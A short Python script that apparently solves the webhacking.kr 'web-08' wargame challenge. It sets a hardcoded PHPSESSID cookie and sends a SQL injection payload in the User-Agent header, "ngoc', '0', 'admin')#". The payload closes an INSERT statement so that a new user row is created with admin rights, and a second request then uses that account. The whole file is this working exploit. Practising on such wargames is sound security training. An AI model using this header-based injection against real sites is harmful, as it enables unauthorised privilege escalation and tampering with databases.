import urllib.request

URL = 'https://webhacking.kr/challenge/web-08/'
PHPSESSID = 'ivpign46edq5u1fmkvjsj6q3n2'


def query(header):
    req.add_header('User-Agent', header)
    r = urllib.request.urlopen(req)
    content = r.read().decode('utf-8')
    print(content)


req = urllib.request.Request(URL)
req.add_header('Cookie', 'PHPSESSID=' + PHPSESSID)
query("ngoc', '0', 'admin')#")
query("ngoc")